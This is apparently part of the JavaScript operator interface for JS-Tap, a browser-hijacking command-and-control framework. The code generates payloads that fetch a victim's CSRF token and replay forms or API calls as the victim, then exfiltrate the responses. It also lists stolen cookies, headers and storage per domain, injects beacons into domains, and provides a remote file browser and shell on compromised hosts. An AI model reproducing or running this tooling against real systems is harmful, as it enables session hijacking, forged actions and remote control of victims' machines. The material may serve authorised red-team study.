		console.log("Payload dump:");
		console.log(payload);


    	// Ok, now we need to push this into the C2 system
		var payloadNameInput   = document.getElementById('payloadName');
		var payloadDescription = document.getElementById('payloadDescription');
		//var payloadCode        = document.getElementById('payload-editor');

		payloadNameInput.value   = "Mimic API payload";
		payloadDescription.value = "Automatically generated custom payload from intercepted API network calls.";
		//payloadCode.value        = payload;
		codeEditor.setValue(payload);

		modal.hide();
		showCustomPayloadModal(true);
	}

	// Pop that sucker open
	var modal = new bootstrap.Modal(document.getElementById('createApiMimicModal'));
	modal.show();
}




async function showMimicFormModal(eventKey, formDataString)
{
	initializeCodeMirror();
	// createFormMimicModal
	console.log("Showing mimic form modal with key: " + eventKey);

	var searchButton = document.getElementById("mimic-form-search-button");
	var nextButton   = document.getElementById("mimic-form-next-button");
	var csrfName     = document.getElementById("csrfNameInput");
	var csrfValue    = document.getElementById("csrfValueInput");

	csrfName.value  = "";
	csrfValue.value = "";

	var formData = JSON.parse(formDataString);

	var formName    = escapeHTML(formData.name);
	var formContent = escapeHTML(unicodeAtob(formData.data));
	var formAction  = escapeHTML(unicodeAtob(formData.action))
	var formMethod  = escapeHTML(formData.method);
	var formEncType = escapeHTML(formData.encType);
	var formURL     = escapeHTML(formData.url);

	var formDataDiv   = document.getElementById('formDataDiv');
	var searchDataDiv = document.getElementById('searchDataDiv');

	formDataDiv.innerHTML = "";

	var data = document.createElement('p');
	data.innerHTML  = 'Form URL: <b>' + formURL + '</b><br>';
	data.innerHTML += 'Form Name: <b>' + formName + '</b><br>';
	data.innerHTML += 'Action: <b>' + formAction + '</b><br>';
	data.innerHTML += 'Method: <b>' + formMethod + '</b><br>';
	data.innerHTML += 'Encoding Type: <b>' + formEncType + '</b><br><br>';

	data.innerHTML += 'Content:' + '<br>';

	var formattedContent = formContent.replace(/\n/g, '<br>');

	formattedContent = formattedContent.replace(/^<br>/, '');
	data.innerHTML  += formattedContent;

    // Append the paragraph to the dynamic div
	formDataDiv.appendChild(data);

	searchDataDiv.innerHTML = "";

	searchButton.onclick = function(event) 
	{
		var canSearch = true;

		if (csrfName.value.trim() === "")
		{
			csrfName.classList.add('is-invalid');
			canSearch = false;
		}
		else
		{
			csrfName.classList.remove('is-invalid');
		}

		if (csrfValue.value.trim() === "")
		{
			csrfValue.classList.add('is-invalid');
			canSearch = false;
		}
		else
		{
			csrfValue.classList.remove('is-invalid');
		}

		if (canSearch)
		{
			searchCSRFToken(eventKey, csrfName.value.trim(), csrfValue.value.trim())
		}

		searchButton.blur();
	}

    // Prep our form parameters/values
	var lines = formContent.trim().split('\n');

	var parsedForm = lines.map(line => {
		var parts = line.trim().split(':');
		return {
			key: parts[0].trim(),
			value: parts[1].trim()
		};
	});

    // console.log("--Parsed form: ");
    // console.log(parsedForm);


    // Generate a mimic payload
	nextButton.onclick = function(event)
	{
    	// Let's generate that payload
		var payload = "";

		payload += "// JS-Tap mimic generated form submission payload\n";
		payload += "// Payload variables below with intercepted values. Modify as you see fit.\n";
		payload += "// ----------------------------------------------------------------------.\n";

		parsedForm.forEach(item => {
			var variableName = item.key.replace(/-/g, '_');

    		// Skip the CSRF variable, we'll handle that later automatically
			if (item.key.trim() === csrfName.value.trim())
			{
				return;
			}

			payload += `var var_${variableName} = '${item.value}';\n`;
		});
		payload += "// ----------------------------------------------------------------------.\n";

	    // Default type on null
		if (formEncType === null || formEncType === undefined || formEncType === '' || formEncType === 'null')
		{
			formEncType = "'application/x-www-form-urlencoded'";
		}

		// Defaults to current page if null, so the page with the CSRF token
		if (formAction === null || formAction === undefined || formAction === '' || formAction === 'null')
		{
			formAction = formURL;
		}

		payload += "\n\n";

		var haveCSRF = false;

		if (searchDataDiv.innerHTML != "")
		{
			haveCSRF = true;
		}

    	// Check if we have a CSRF token to deal with
		if (haveCSRF)
		{
    		// There is a CSRF token to contend with
			console.log("** Generating payload with a CSRF token...");
			payload += "// Get the CSRF token first\n";
			payload += "fetch('" + tokenUrl + "')\n";
			payload += "	.then(response =>{\n";
			payload += "		if(!response.ok){\n";
			payload += "			customExfil('Error', 'Error fetching CSRF Token with Mimic payload');\n";
			payload += "            throw new Error('Error fetching CSRF Token with Mimic payload');\n";
			payload += "		}\n";
			payload += "		return response.text();\n";
			payload += "	})\n";
			payload += "	.then(text => {\n";
			payload += "		var fetchedContent = text;\n";
			payload += "		var parser         = new DOMParser();\n";
			payload += "		var parsedDoc      = parser.parseFromString(fetchedContent, 'text/html');\n";
			payload += `		var tokenInput     = parsedDoc.querySelector('input[name="` + csrfName.value + `"]');\n`;
			payload += "		\n";
			payload += "		return tokenInput ? tokenInput.value : null;\n";
			payload += "	})\n";
			payload += "	.then(csrfToken => {\n";
			payload += "		if (!csrfToken) {\n";
			payload += "			customExfil('Error', 'Error using CSRF Token in mimic payload');\n";
			payload += "            throw new Error('Error using CSRF Token in Mimic payload');\n";
			payload += "		}\n\n";
		}
		
		payload += "		var bodyData = {\n";

		parsedForm.forEach((item, index, array) => {
			var variableName = item.key.replace(/-/g, '_');

			// Skip the CSRF variable, we'll handle that after the loop
			if (item.key.trim() === csrfName.value.trim())
			{
				return;
			}

			payload += `			"${item.key}": var_${variableName},\n`;
		});
		if (haveCSRF)
		{
			payload += `			"${csrfName.value.trim()}": csrfToken\n`;
		}
		payload += "		};\n";

		payload += "		// Final request is below:\n";
		payload += "		fetch('" + formAction + "', {\n";
		payload += `			method: '${formMethod}',\n`;
		payload += "			headers: {\n";
		payload += `				'Content-Type': ${formEncType},\n`;
		payload += "			},\n";

		// console.log("$$$$$ encType: " + formEncType);
		if (formEncType == "'application/x-www-form-urlencoded'")
		{

			payload += "			body: Object.keys(bodyData).map(key => encodeURIComponent(key) + '=' + encodeURIComponent(bodyData[key])).join('&')\n";
		}
		else if (formEncType == "'application/json'")
		{
			payload += "			body: JSON.stringify(bodyData)\n";
		}
		else
		{
			console.log("*** Error, this encoding type not handled yet");
			showToast('Error in mimic generator, unhandled form encoding type: ' + formEncType, 'danger');
		}

		payload += "		})\n";
		payload += "		.then(response => {\n";
		payload += "			var statusCode   = response.status;\n";
		payload += "			return response.text().then(responseBody => {\n";
		payload += "				customExfil('Payload Response, Status code: ' + statusCode, 'Response Body:' + responseBody);\n";
		payload += "			});\n";
		payload += "		})\n";
		payload += "        .catch(error => {\n";
		payload += "			customExfil('Error', 'Caught error in mimic payload');\n";
		payload += "		})\n";

		if (haveCSRF)
		{
			payload += "	});\n";
		}


		console.log("Generated payload:");
		console.log(payload);

		nextButton.blur();

    	// Ok, now we need to push this into the C2 system
		var payloadNameInput   = document.getElementById('payloadName');
		var payloadDescription = document.getElementById('payloadDescription');
		//var payloadCode        = document.getElementById('payload-editor');

		payloadNameInput.value   = "Mimic Form submission payload";
		payloadDescription.value = "Automatically generated custom payload from form submission.";
		//payloadCode.value        = payload;
		codeEditor.setValue(payload);

		modal.hide();
		showCustomPayloadModal(true);
	}

	var modal = new bootstrap.Modal(document.getElementById('createFormMimicModal'));
	modal.show();
}





function showAboutModal()
{
	var modal = new bootstrap.Modal(document.getElementById("aboutModal"));
	modal.show();
}



function showGuideModal()
{
	var modal = new bootstrap.Modal(document.getElementById("guideModal"));
	modal.show();
}




async function toggleDomainDetails(domainID, btnElement) {
	var detailsArea = document.getElementById('domain-details-' + domainID);

	if (detailsArea.style.display !== 'none') {
		// Already open, close it
		detailsArea.innerHTML = '';
        detailsArea.style.display = 'none';
		btnElement.textContent = 'View Details';
		return;
	}

	btnElement.textContent = 'Hide Details';
    detailsArea.style.display = 'block';
	
    // Tab Headers
    detailsArea.innerHTML = `
        <ul class="nav nav-tabs" id="tab-${domainID}" role="tablist">
            <li class="nav-item" role="presentation">
                <button class="nav-link active" id="history-tab-${domainID}" data-bs-toggle="tab" data-bs-target="#history-content-${domainID}" type="button" role="tab" aria-selected="true">History</button>
            </li>
            <li class="nav-item" role="presentation">
                <button class="nav-link" id="captures-tab-${domainID}" data-bs-toggle="tab" data-bs-target="#captures-content-${domainID}" type="button" role="tab" aria-selected="false">Captures</button>
            </li>
        </ul>
        <div class="tab-content border border-top-0 p-3" id="tabContent-${domainID}">
            <div class="tab-pane fade show active" id="history-content-${domainID}" role="tabpanel">
                <div class="d-flex justify-content-center"><div class="spinner-border spinner-border-sm" role="status"></div>&nbsp;Loading history...</div>
            </div>
            <div class="tab-pane fade" id="captures-content-${domainID}" role="tabpanel">
                <div class="d-flex justify-content-center"><div class="spinner-border spinner-border-sm" role="status"></div>&nbsp;Loading captures...</div>
            </div>
        </div>
    `;

    // Fetch History
    try {
		var visitResp = await fetch('/api/jstap/visits/' + domainID);
		var visits = await visitResp.json();
        var historyContent = document.getElementById('history-content-' + domainID);

		if (visits.length === 0) {
			historyContent.innerHTML = '<div class="alert alert-secondary">No visit history found.</div>';
		} else {
            var timelineHtml = '<ul class="list-group list-group-flush">';
            for (let v of visits) {
                timelineHtml += `
                    <li class="list-group-item d-flex justify-content-between align-items-start">
                        <div class="ms-2 me-auto text-break" style="font-family: monospace; font-size: 0.9em;">
                            ${escapeHTML(v.url)}
                        </div>
                        <span class="badge bg-light text-dark rounded-pill">${humanized_time_span(v.visitTime)}</span>
                    </li>
                `;
            }
            timelineHtml += '</ul>';
            historyContent.innerHTML = timelineHtml;
        }
    } catch (e) {
        document.getElementById('history-content-' + domainID).innerHTML = '<div class="alert alert-danger">Error loading history.</div>';
    }


    // Fetch Captures — organized into sub-tabs by type
	try {
		var resp = await fetch('/api/jstap/captures/' + domainID);
		var captures = await resp.json();
        var captureContent = document.getElementById('captures-content-' + domainID);

		if (captures.length === 0) {
			captureContent.innerHTML = '<div class="alert alert-secondary">No captures found for this domain.</div>';
		} else {
			// Categorize captures by type
			var cookieCaptures = captures.filter(function(c) { return c.type === 'cookie'; });
			var headerCaptures = captures.filter(function(c) { return c.type === 'header'; });
			var localStorageCaptures = captures.filter(function(c) { return c.type === 'local_storage' || c.type === 'storage'; });
			var sessionStorageCaptures = captures.filter(function(c) { return c.type === 'session_storage'; });

			var subTabsHtml = `
				<ul class="nav nav-pills nav-fill mb-3" id="capture-subtabs-${domainID}" role="tablist">
					<li class="nav-item" role="presentation">
						<button class="nav-link active" id="cookies-subtab-${domainID}" data-bs-toggle="pill" data-bs-target="#cookies-subcontent-${domainID}" type="button" role="tab" aria-selected="true">Cookies <span class="badge bg-light text-dark">${cookieCaptures.length}</span></button>
					</li>
					<li class="nav-item" role="presentation">
						<button class="nav-link" id="headers-subtab-${domainID}" data-bs-toggle="pill" data-bs-target="#headers-subcontent-${domainID}" type="button" role="tab" aria-selected="false">Headers <span class="badge bg-light text-dark">${headerCaptures.length}</span></button>
					</li>
					<li class="nav-item" role="presentation">
						<button class="nav-link" id="lstorage-subtab-${domainID}" data-bs-toggle="pill" data-bs-target="#lstorage-subcontent-${domainID}" type="button" role="tab" aria-selected="false">Local Storage <span class="badge bg-light text-dark">${localStorageCaptures.length}</span></button>
					</li>
					<li class="nav-item" role="presentation">
						<button class="nav-link" id="sstorage-subtab-${domainID}" data-bs-toggle="pill" data-bs-target="#sstorage-subcontent-${domainID}" type="button" role="tab" aria-selected="false">Session Storage <span class="badge bg-light text-dark">${sessionStorageCaptures.length}</span></button>
					</li>
				</ul>
				<div class="tab-content" id="capture-subtab-content-${domainID}">
			`;

			// --- Cookies sub-tab ---
			subTabsHtml += `<div class="tab-pane fade show active" id="cookies-subcontent-${domainID}" role="tabpanel">`;
			if (cookieCaptures.length === 0) {
				subTabsHtml += '<div class="alert alert-secondary">No cookies captured.</div>';
			} else {
				subTabsHtml += `<div class="table-responsive"><table class="table table-sm table-striped table-bordered"><thead class="table-dark"><tr><th>Name</th><th>Value</th><th>HttpOnly</th><th>Secure</th><th>SameSite</th><th>Path</th></tr></thead><tbody>`;
				for (var i = 0; i < cookieCaptures.length; i++) {
					var c = cookieCaptures[i];
					var meta = null;
					try { if (c.metadata) meta = JSON.parse(c.metadata); } catch(e) {}
					var httpOnlyBadge = meta && meta.httpOnly ? '<span class="badge bg-danger">Yes</span>' : '<span class="badge bg-secondary">No</span>';
					var secureBadge = meta && meta.secure ? '<span class="badge bg-success">Yes</span>' : '<span class="badge bg-secondary">No</span>';
					var sameSiteVal = meta ? escapeHTML(meta.sameSite || 'unspecified') : '-';
					var pathVal = meta ? escapeHTML(meta.path || '/') : '-';
					subTabsHtml += '<tr><td>' + escapeHTML(c.name) + '</td><td style="word-break: break-all; font-family: monospace; font-size: 0.9em;">' + escapeHTML(c.value) + '</td><td>' + httpOnlyBadge + '</td><td>' + secureBadge + '</td><td>' + sameSiteVal + '</td><td>' + pathVal + '</td></tr>';
				}
				subTabsHtml += '</tbody></table></div>';
			}
			subTabsHtml += '</div>';

			// --- Headers sub-tab ---
			subTabsHtml += `<div class="tab-pane fade" id="headers-subcontent-${domainID}" role="tabpanel">`;
			if (headerCaptures.length === 0) {
				subTabsHtml += '<div class="alert alert-secondary">No headers captured.</div>';
			} else {
				subTabsHtml += '<div class="table-responsive"><table class="table table-sm table-striped table-bordered"><thead class="table-dark"><tr><th>Header Name</th><th>Value</th></tr></thead><tbody>';
				for (var i = 0; i < headerCaptures.length; i++) {
					var c = headerCaptures[i];
					subTabsHtml += '<tr><td>' + escapeHTML(c.name) + '</td><td style="word-break: break-all; font-family: monospace; font-size: 0.9em;">' + escapeHTML(c.value) + '</td></tr>';
				}
				subTabsHtml += '</tbody></table></div>';
			}
			subTabsHtml += '</div>';

			// --- Local Storage sub-tab ---
			subTabsHtml += `<div class="tab-pane fade" id="lstorage-subcontent-${domainID}" role="tabpanel">`;
			if (localStorageCaptures.length === 0) {
				subTabsHtml += '<div class="alert alert-secondary">No local storage captured.</div>';
			} else {
				subTabsHtml += '<div class="table-responsive"><table class="table table-sm table-striped table-bordered"><thead class="table-dark"><tr><th>Key</th><th>Value</th></tr></thead><tbody>';
				for (var i = 0; i < localStorageCaptures.length; i++) {
					var c = localStorageCaptures[i];
					subTabsHtml += '<tr><td>' + escapeHTML(c.name) + '</td><td style="word-break: break-all; font-family: monospace; font-size: 0.9em;">' + escapeHTML(c.value) + '</td></tr>';
				}
				subTabsHtml += '</tbody></table></div>';
			}
			subTabsHtml += '</div>';

			// --- Session Storage sub-tab ---
			subTabsHtml += `<div class="tab-pane fade" id="sstorage-subcontent-${domainID}" role="tabpanel">`;
			if (sessionStorageCaptures.length === 0) {
				subTabsHtml += '<div class="alert alert-secondary">No session storage captured.</div>';
			} else {
				subTabsHtml += '<div class="table-responsive"><table class="table table-sm table-striped table-bordered"><thead class="table-dark"><tr><th>Key</th><th>Value</th></tr></thead><tbody>';
				for (var i = 0; i < sessionStorageCaptures.length; i++) {
					var c = sessionStorageCaptures[i];
					subTabsHtml += '<tr><td>' + escapeHTML(c.name) + '</td><td style="word-break: break-all; font-family: monospace; font-size: 0.9em;">' + escapeHTML(c.value) + '</td></tr>';
				}
				subTabsHtml += '</tbody></table></div>';
			}
			subTabsHtml += '</div>';

			subTabsHtml += '</div>'; // close tab-content
			captureContent.innerHTML = subTabsHtml;
		}
	} catch (e) {
		document.getElementById('captures-content-' + domainID).innerHTML = '<div class="alert alert-danger">Error loading captures.</div>';
	}
}


function toggleBexInjection(beaconID, domain, isActive) {
    if (isActive) {
        showConfirmModal('Stop Injection', 'Stop injecting DOM Beacon into ' + domain + '?', function() {
            fetch('/api/jstap/stop_inject', {
                method: 'POST',
                body: JSON.stringify({ beaconID: beaconID, domain: domain }),
                headers: { "Content-type": "application/json; charset=UTF-8" }
            }).then(function() {
                showToast('Injection stopped for ' + domain);
                getClientDetails(beaconID);
            });
        });
    } else {
        showInjectOptionsModal(domain, function(tag, serverUrl) {
            fetch('/api/jstap/inject', {
                method: 'POST',
                body: JSON.stringify({ beaconID: beaconID, domain: domain, tag: tag, serverUrl: serverUrl }),
                headers: { "Content-type": "application/json; charset=UTF-8" }
            }).then(function() {
                showToast('Injection queued for ' + domain);
                getClientDetails(beaconID);
            });
        });
    }
}


// ---- Ticket Functions ----

async function generateSessionTicket(domainID) {
    try {
        var resp = await fetch('/api/jstap/ticket/' + domainID);
        if (!resp.ok) {
            showToast('Failed to generate ticket', 'danger');
            return;
        }
        var ticket = await resp.json();
        var text = btoa(JSON.stringify(ticket));
        navigator.clipboard.writeText(text).then(function() {
            showToast('Session Ticket copied to clipboard');
        }).catch(function() {
            showToast('Clipboard unavailable', 'danger');
        });
    } catch (err) {
        showToast('Failed to generate ticket: ' + err.message, 'danger');
    }
}


async function generateProxyTicket(beaconId) {
    try {
        var resp = await fetch('/api/jstap/proxy_ticket/' + beaconId);
        if (!resp.ok) {
            var errData = await resp.json().catch(function() { return {}; });
            showToast(errData.error || 'Proxy not active for this beacon', 'danger');
            return;
        }
        var ticket = await resp.json();
        var text = btoa(JSON.stringify(ticket));
        navigator.clipboard.writeText(text).then(function() {
            showToast('Proxy Ticket copied to clipboard');
        }).catch(function() {
            showToast('Clipboard unavailable', 'danger');
        });
    } catch (err) {
        showToast('Failed to generate proxy ticket: ' + err.message, 'danger');
    }
}


// ---- Sidecar Functions ----

var _sidecarLastReadContent = null;
var _sidecarLastReadFileName = null;
var _sidecarCurrentPath = '';
var _sidecarShellCwd = '';
var _sidecarShellHistory = [];
var _sidecarShellHistoryIndex = -1;
var _sidecarShellOutput = '';
var _sidecarShellBeaconId = '';
var _sidecarShellNickname = '';
var _sidecarShellIsWindows = false;
var _sidecarShellQueue = [];
var _sidecarShellRunning = false;

function sidecarDownloadFile() {
    if (!_sidecarLastReadContent || !_sidecarLastReadFileName) return;
    try {
        var raw = atob(_sidecarLastReadContent);
        var arr = new Uint8Array(raw.length);
        for (var i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
        var blob = new Blob([arr], { type: 'application/octet-stream' });
        var url = URL.createObjectURL(blob);
        var a = document.createElement('a');
        a.href = url;
        a.download = _sidecarLastReadFileName;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    } catch (e) {
        console.error('Download failed:', e);
    }
}

async function sidecarUploadFile(beaconId) {
    var fileInput = document.getElementById('sidecar-upload-file');
    var statusDiv = document.getElementById('sidecar-upload-status');
    if (!fileInput || !statusDiv) return;

    var file = fileInput.files[0];
    if (!file) {
        statusDiv.innerHTML = '<div class="alert alert-warning alert-sm py-1">No file selected.</div>';
        return;
    }

    var maxSize = 700 * 1024;
    if (file.size > maxSize) {
        statusDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">File too large (' + formatSidecarBytes(file.size) + '). Maximum is 700 KB.</div>';
        return;
    }

    var base = _sidecarCurrentPath || '/';
    var sep = base.endsWith('/') || base.endsWith('\\') ? '' : '/';
    var dest = base + sep + file.name;

    statusDiv.innerHTML = '<div class="spinner-border spinner-border-sm text-secondary" role="status"></div> Uploading...';

    try {
        var buffer = await file.arrayBuffer();
        var bytes = new Uint8Array(buffer);
        var binary = '';
        for (var i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
        var b64 = btoa(binary);

        var resp = await fetch('/api/sidecar/command', {
            method: 'POST',
            body: JSON.stringify({ beaconID: beaconId, command: 'write_file', args: { path: dest, content: b64 } }),
            headers: { "Content-type": "application/json" }
        });

        if (!resp.ok) {
            var errText = await resp.text();
            statusDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">' + escapeHTML(errText) + '</div>';
            return;
        }

        var json = await resp.json();
        pollSidecarResult(json.requestId, function(result) {
            if (!result.success) {
                statusDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">' + escapeHTML(result.error || 'Unknown error') + '</div>';
                return;
            }
            statusDiv.innerHTML = '<div class="alert alert-success alert-sm py-1">Uploaded ' + formatSidecarBytes(result.data.bytesWritten) + ' to <b>' + escapeHTML(result.data.path) + '</b></div>';
            fileInput.value = '';
            sidecarBrowse(beaconId);
        });
    } catch (e) {
        statusDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">Upload failed: ' + escapeHTML(String(e)) + '</div>';
    }
}

async function sidecarBrowse(beaconId) {
    var pathInput = document.getElementById('sidecar-path');
    var path = pathInput ? pathInput.value : '/';
    var resultsDiv = document.getElementById('sidecar-file-results');
    if (!resultsDiv) return;
    resultsDiv.innerHTML = '<div class="spinner-border spinner-border-sm text-secondary" role="status"></div> Browsing...';

    try {
        var resp = await fetch('/api/sidecar/command', {
            method: 'POST',
            body: JSON.stringify({ beaconID: beaconId, command: 'list_dir', args: { path: path } }),
            headers: { "Content-type": "application/json" }
        });

        if (!resp.ok) {
            var errText = await resp.text();
            resultsDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">' + escapeHTML(errText) + '</div>';
            return;
        }

        var json = await resp.json();
        pollSidecarResult(json.requestId, function(result) {
            if (!result.success) {
                resultsDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">' + escapeHTML(result.error) + '</div>';
                return;
            }
            var entries = (result.data && result.data.entries) || [];
            var resolvedPath = (result.data && result.data.path) || path;

            // Update path input to resolved absolute path
            _sidecarCurrentPath = resolvedPath;
            if (pathInput) pathInput.value = resolvedPath;

            var html = '<table class="table table-sm table-striped mb-0" style="font-size: 0.85em;">';
            html += '<thead><tr><th>Name</th><th>Size</th><th>Modified</th><th></th></tr></thead><tbody>';

            // Parent directory link
            if (resolvedPath !== '/' && resolvedPath !== '') {
                var parentPath = resolvedPath.replace(/\\/g, '/');
                var parts = parentPath.split('/').filter(Boolean);
                parts.pop();
                var parent = parts.length === 0 ? '/' : '/' + parts.join('/');
                // Windows: if path like C:/foo, parent should be C:/
                if (/^[A-Za-z]:/.test(resolvedPath)) {
                    var wparts = resolvedPath.replace(/\\/g, '/').split('/').filter(Boolean);
                    wparts.pop();
                    parent = wparts.length === 0 ? resolvedPath.substring(0, 3) : wparts.join('/');
                }
				html += '<tr><td><a href="#" onclick="sidecarNavigate(\'' + beaconId + '\', \'' + escapeHTML(parent).replace(/\\/g, "\\\\").replace(/'/g, "\\'") + '\'); return false;">..</a></td><td></td><td></td><td></td></tr>';            
			}

            entries.forEach(function(e) {
                var sep = resolvedPath.endsWith('/') || resolvedPath.endsWith('\\') ? '' : '/';
                var fullPath = resolvedPath + sep + e.name;
                if (e.isDir) {
					html += '<tr><td><a href="#" onclick="sidecarNavigate(\'' + beaconId + '\', \'' + escapeHTML(fullPath).replace(/\\/g, "\\\\").replace(/'/g, "\\'") + '\'); return false;">&#128193; ' + escapeHTML(e.name) + '/</a></td>';
                } else {
                    html += '<tr><td>' + escapeHTML(e.name) + '</td>';
                }
                html += '<td>' + (e.isDir ? '' : formatSidecarBytes(e.size)) + '</td>';
                html += '<td><small>' + escapeHTML(e.modTime || '') + '</small></td>';
                if (!e.isDir) {
					html += '<td><button class="btn btn-primary btn-sm py-0 px-1" style="font-size:0.75em;" onclick="sidecarReadFile(\'' + beaconId + '\', \'' + escapeHTML(fullPath).replace(/\\/g, "\\\\").replace(/'/g, "\\'") + '\')">Read</button></td>';
                } else {
                    html += '<td></td>';
                }
                html += '</tr>';
            });
            html += '</tbody></table>';
            resultsDiv.innerHTML = html;
        });
    } catch (e) {
        resultsDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">Request failed: ' + escapeHTML(String(e)) + '</div>';
    }
}


function sidecarNavigate(beaconId, path) {
    var pathInput = document.getElementById('sidecar-path');
    if (pathInput) pathInput.value = path;
    sidecarBrowse(beaconId);
}


function sidecarShellUpdatePrompt() {
    var prompt = document.getElementById('sidecar-shell-prompt');
    if (prompt) prompt.textContent = (_sidecarShellCwd || '~') + ' $ ';
}

function sidecarShellAppendOutput(html) {
    _sidecarShellOutput += html;
    var outputDiv = document.getElementById('sidecar-shell-output');
    if (outputDiv) {
        outputDiv.innerHTML = _sidecarShellOutput;
        outputDiv.scrollTop = outputDiv.scrollHeight;
    }
}

function sidecarShellRemoveRunning(runId) {
    var marker = 'id="shell-running-' + runId + '"';
    _sidecarShellOutput = _sidecarShellOutput.replace(new RegExp('<div [^>]*' + marker.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '[^>]*>.*?</div>'), '');
    var el = document.getElementById('shell-running-' + runId);
    if (el) el.remove();
}

function sidecarShellExec(beaconId) {
    var cmdInput = document.getElementById('sidecar-shell-input');
    var rawCmd = cmdInput ? cmdInput.value : '';
    if (!rawCmd.trim()) return;
    cmdInput.value = '';

    _sidecarShellHistory.push(rawCmd);
    _sidecarShellHistoryIndex = _sidecarShellHistory.length;

    // Queue the raw command; the runner will wrap it with the current CWD
    _sidecarShellQueue.push({ beaconId: beaconId, rawCmd: rawCmd });
    _sidecarShellProcessQueue();
}

function _sidecarShellProcessQueue() {
    if (_sidecarShellRunning || _sidecarShellQueue.length === 0) return;
    _sidecarShellRunning = true;

    var item = _sidecarShellQueue.shift();
    _sidecarShellRunOne(item.beaconId, item.rawCmd);
}

async function _sidecarShellRunOne(beaconId, rawCmd) {
    // Wrap with CURRENT CWD (which may have been updated by prior queued commands)
    // Windows cmd.exe uses & as separator, cd (no args) instead of pwd, and double quotes
    var wrappedCmd;
    if (_sidecarShellIsWindows) {
        var cwdEscaped = _sidecarShellCwd.replace(/"/g, '""');
        if (_sidecarShellCwd) {
            wrappedCmd = 'cd /d "' + cwdEscaped + '" && ' + rawCmd + ' & echo __SIDECAR_CWD__& cd';
        } else {
            wrappedCmd = rawCmd + ' & echo __SIDECAR_CWD__& cd';
        }
    } else {
        var cwdEscaped = _sidecarShellCwd.replace(/'/g, "'\\''");
        if (_sidecarShellCwd) {
            wrappedCmd = "cd '" + cwdEscaped + "' && " + rawCmd + "; echo '__SIDECAR_CWD__'; pwd";
        } else {
            wrappedCmd = rawCmd + "; echo '__SIDECAR_CWD__'; pwd";
        }
    }

    var promptText = escapeHTML((_sidecarShellCwd || '~') + ' $ ' + rawCmd);
    var runId = Date.now() + '' + Math.random();
    sidecarShellAppendOutput('<div style="color:#ddd;white-space:pre-wrap;">' + promptText + '</div>');
    sidecarShellAppendOutput('<div id="shell-running-' + escapeHTML(runId) + '" style="color:#888;"><span class="spinner-border spinner-border-sm" role="status"></span> Running...</div>');

    try {
        var resp = await fetch('/api/sidecar/command', {
            method: 'POST',
            body: JSON.stringify({ beaconID: beaconId, command: 'exec_cmd', args: { command: wrappedCmd } }),
            headers: { "Content-type": "application/json" }
        });

        if (!resp.ok) {
            var errText = await resp.text();
            sidecarShellRemoveRunning(runId);
            sidecarShellAppendOutput('<div style="color:#ddd;white-space:pre-wrap;">ERROR: ' + escapeHTML(errText) + '</div>');
            _sidecarShellRunning = false;
            _sidecarShellProcessQueue();
            return;
        }

        var json = await resp.json();
        pollSidecarResult(json.requestId, function(result) {
            sidecarShellRemoveRunning(runId);
            if (!result.success) {
                sidecarShellAppendOutput('<div style="color:#ddd;white-space:pre-wrap;">ERROR: ' + escapeHTML(result.error || 'Unknown error') + '</div>');
            } else {
                var stdout = (result.data && result.data.stdout) || '';
                var stderr = (result.data && result.data.stderr) || '';

                // Parse CWD from stdout
                var markerStr = '__SIDECAR_CWD__';
                var markerIdx = stdout.lastIndexOf(markerStr);
                if (markerIdx !== -1) {
                    var cmdOutput = stdout.substring(0, markerIdx).replace(/\n$/, '');
                    var newCwd = stdout.substring(markerIdx + markerStr.length).trim();
                    if (newCwd) _sidecarShellCwd = newCwd;
                    if (cmdOutput) {
                        sidecarShellAppendOutput('<div style="color:#ddd;white-space:pre-wrap;">' + escapeHTML(cmdOutput) + '</div>');
                    }
                } else {
                    // Marker not found (timeout or binary output) — show all stdout
                    if (stdout) {
                        sidecarShellAppendOutput('<div style="color:#ddd;white-space:pre-wrap;">' + escapeHTML(stdout) + '</div>');
                    }
                }

                if (stderr) {
                    sidecarShellAppendOutput('<div style="color:#ddd;white-space:pre-wrap;">' + escapeHTML(stderr) + '</div>');
                }

                sidecarShellUpdatePrompt();
            }

            // Process next queued command (CWD is now up to date)
            _sidecarShellRunning = false;
            _sidecarShellProcessQueue();
        });
    } catch (e) {
        sidecarShellRemoveRunning(runId);
        sidecarShellAppendOutput('<div style="color:#ddd;white-space:pre-wrap;">Request failed: ' + escapeHTML(String(e)) + '</div>');
        _sidecarShellRunning = false;
        _sidecarShellProcessQueue();
    }
}

function sidecarShellKeyHandler(event, beaconId) {
    if (event.key === 'Enter') {
        sidecarShellExec(beaconId);
    } else if (event.key === 'ArrowUp') {
        event.preventDefault();
        if (_sidecarShellHistoryIndex > 0) {
            _sidecarShellHistoryIndex--;
            event.target.value = _sidecarShellHistory[_sidecarShellHistoryIndex];
        }
    } else if (event.key === 'ArrowDown') {
        event.preventDefault();
        if (_sidecarShellHistoryIndex < _sidecarShellHistory.length - 1) {
            _sidecarShellHistoryIndex++;
            event.target.value = _sidecarShellHistory[_sidecarShellHistoryIndex];
        } else {
            _sidecarShellHistoryIndex = _sidecarShellHistory.length;
            event.target.value = '';
        }
    }
}

function sidecarPopOutShell(beaconId) {
    var popWin = window.open('about:blank', '_blank', 'width=800,height=600,menubar=no,toolbar=no,location=no,status=no');
    if (!popWin) { showToast('Pop-up blocked. Please allow pop-ups for this site.', 'warning'); return; }

    var isAtomShell = (beaconId == lastSelectedElectronId);
    var isV8Shell = (beaconId == lastSelectedNodeId);
    var shellLabel = isAtomShell ? 'Atom Shell' : isV8Shell ? 'V8 Shell' : 'Sidecar Shell';
    var titleText = shellLabel + ' - ' + (_sidecarShellNickname || beaconId);
    var transferState = {
        beaconId: beaconId,
        cwd: _sidecarShellCwd,
        history: _sidecarShellHistory.slice(),
        output: _sidecarShellOutput,
        nickname: _sidecarShellNickname || beaconId,
        isWindows: _sidecarShellIsWindows
    };

    var htmlContent = '<!DOCTYPE html><html><head><title>' + escapeHTML(titleText) + '</title>' +
    '<style>' +
    '*, *::before, *::after { box-sizing: border-box; }' +
